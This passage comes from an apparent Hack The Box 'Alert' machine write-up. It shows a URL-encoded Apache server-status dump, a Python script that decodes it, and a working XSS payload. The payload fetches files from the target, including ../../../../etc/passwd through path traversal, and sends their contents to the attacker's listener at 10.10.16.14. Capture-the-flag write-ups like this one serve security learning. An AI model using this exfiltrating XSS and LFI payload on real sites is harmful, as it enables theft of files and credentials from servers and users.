%2Ftd%3E%3Ctd%3E0.00%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E42-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F1%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E733%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.00%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E43-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F1%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E732%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.00%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E44-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F41%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E691%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E5%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.02%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E45-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F15%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E713%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E2%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.01%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E46-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F1%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E730%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.00%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E47-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F41%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E693%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E5%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.02%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E48-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F41%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E700%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E5%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.02%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E49-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F40%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E688%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E5%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.02%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E50-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F39%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E707%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E4%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.02%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E51-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F39%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E709%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E4%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.02%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E52-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E3309%3C%2Ftd%3E%3Ctd%3E0%2F50%2F50%3C%2Ftd%3E%3Ctd%3E_%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E16%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E15%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.03%3C%2Ftd%3E%3Ctd%3E0.03%0A%3C%2Ftd%3E%3Ctd%3E10.10.16.14%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EGET%20%2Findex.php%3Fpage%3Dcontact%20HTTP%2F1.1%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E53-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F37%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E708%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E5%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.02%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E54-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F1%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E729%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.00%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E55-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F1%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E728%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.00%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E56-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E3313%3C%2Ftd%3E%3Ctd%3E0%2F10%2F10%3C%2Ftd%3E%3Ctd%3E_%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E29%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E3%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.01%3C%2Ftd%3E%3Ctd%3E0.01%0A%3C%2Ftd%3E%3Ctd%3E10.10.16.14%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EGET%20%2Findex.php%3Fpage%3Dupload%20HTTP%2F1.1%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E57-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F22%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E706%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E2%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.01%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E58-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F20%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E702%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E3%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.01%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E59-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F20%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E704%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E3%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.01%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E60-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F19%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E698%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E2%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.01%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E61-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F16%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E684%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E1%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.01%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E62-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F18%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E687%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E1%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.01%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E63-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F17%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E689%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E2%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.01%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E64-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E3321%3C%2Ftd%3E%3Ctd%3E0%2F25%2F25%3C%2Ftd%3E%3Ctd%3E_%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E40%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E5%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.02%3C%2Ftd%3E%3Ctd%3E0.02%0A%3C%2Ftd%3E%3Ctd%3E10.10.16.14%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EGET%20%2Fcss%2Fpath-to-markdown-background-image%20HTTP%2F1.1%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E65-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F16%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E685%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E1%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.01%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E66-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E3323%3C%2Ftd%3E%3Ctd%3E2%2F29%2F29%3C%2Ftd%3E%3Ctd%3E%3Cb%3EK%3C%2Fb%3E%0A%3C%2Ftd%3E%3Ctd%3E0.01%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E83%3C%2Ftd%3E%3Ctd%3E2.3%3C%2Ftd%3E%3Ctd%3E0.02%3C%2Ftd%3E%3Ctd%3E0.02%0A%3C%2Ftd%3E%3Ctd%3E10.10.16.14%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EGET%20%2Findex.php%3Fpage%3Dcontact%26amp%3Bstatus%3DMessage%2520sent%2520successfull%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E67-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F1%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E690%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.00%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E68-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F14%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E697%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E1%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.01%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E69-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F15%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E683%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E2%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.01%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3C%2Ftable%3E%0A%20%3Chr%20%2F%3E%20%3Ctable%3E%0A%20%3Ctr%3E%3Cth%3ESrv%3C%2Fth%3E%3Ctd%3EChild%20Server%20number%20-%20generation%3C%2Ftd%3E%3C%2Ftr%3E%0A%20%3Ctr%3E%3Cth%3EPID%3C%2Fth%3E%3Ctd%3EOS%20process%20ID%3C%2Ftd%3E%3C%2Ftr%3E%0A%20%3Ctr%3E%3Cth%3EAcc%3C%2Fth%3E%3Ctd%3ENumber%20of%20accesses%20this%20connection%20%2F%20this%20child%20%2F%20this%20slot%3C%2Ftd%3E%3C%2Ftr%3E%0A%20%3Ctr%3E%3Cth%3EM%3C%2Fth%3E%3Ctd%3EMode%20of%20operation%3C%2Ftd%3E%3C%2Ftr%3E%0A%3Ctr%3E%3Cth%3ECPU%3C%2Fth%3E%3Ctd%3ECPU%20usage%2C%20number%20of%20seconds%3C%2Ftd%3E%3C%2Ftr%3E%0A%3Ctr%3E%3Cth%3ESS%3C%2Fth%3E%3Ctd%3ESeconds%20since%20beginning%20of%20most%20recent%20request%3C%2Ftd%3E%3C%2Ftr%3E%0A%20%3Ctr%3E%3Cth%3EReq%3C%2Fth%3E%3Ctd%3EMilliseconds%20required%20to%20process%20most%20recent%20request%3C%2Ftd%3E%3C%2Ftr%3E%0A%20%3Ctr%3E%3Cth%3EDur%3C%2Fth%3E%3Ctd%3ESum%20of%20milliseconds%20required%20to%20process%20all%20requests%3C%2Ftd%3E%3C%2Ftr%3E%0A%20%3Ctr%3E%3Cth%3EConn%3C%2Fth%3E%3Ctd%3EKilobytes%20transferred%20this%20connection%3C%2Ftd%3E%3C%2Ftr%3E%0A%20%3Ctr%3E%3Cth%3EChild%3C%2Fth%3E%3Ctd%3EMegabytes%20transferred%20this%20child%3C%2Ftd%3E%3C%2Ftr%3E%0A%20%3Ctr%3E%3Cth%3ESlot%3C%2Fth%3E%3Ctd%3ETotal%20megabytes%20transferred%20this%20slot%3C%2Ftd%3E%3C%2Ftr%3E%0A%20%3C%2Ftable%3E%0A%3Chr%20%2F%3E%0A%3Caddress%3EApache%2F2.4.41%20(Ubuntu)%20Server%20at%20alert.htb%20Port%2080%3C%2Faddress%3E%0A%3C%2Fbody%3E%3C%2Fhtml%3E%0A"""

decoded_data = urllib.parse.unquote(encoded_data)
with open("decoded_page.html", "w") as write_h:
    print(decoded_data, file=write_h)
```

The script is run with `python script_name.py`.

### Python server

The server is started via a terminal. In this case port 8004 was used.

```bash
$ python3 -m http.server 8004
```

### Browsing the page

The page is opened via a browser and the url `127.0.0.1:<http-server-port>/decoded_page.html`, and same methodology is used for the other paths.

### /server-status/

### /Messages/

### /uploads/

## Investigating the paths

From `/messages/` there's a file `2024-03-10_15-48-34.txt` that seems interesting.

The page source shows
  
i.e containing a path `messages.php?file=2024-03-10_15-48-34.txt`.

The payload is modified to attempt to retrieve that file.

### Modified XSS payload
```
<script>document.body.innerHTML='<h1>Loading...</h1>';fetch('http://alert.htb/messages.php?file=2024-03-10_15-48-34.txt').then(response=>response.text()).then(data=>fetch('http://10.10.16.14:4441/log.php?content='+encodeURIComponent(data))).catch(error=>fetch('http://10.10.16.14:4441/log.php?error='+encodeURIComponent(error.message)));setTimeout(()=>{window.location.href='http://alert.htb/';}, 3001);</script>
```

The file itself is essentially empty.  
  
However, it revealed it is possible to get the contents of *a file*, and naturally a thought is born. 'What if it was *another* file?'

The same as above is done but for `../../../../../../etc/passwd`. 
It works. XXS to LFI:

```
Ncat: Connection from 10.10.11.44:35994.
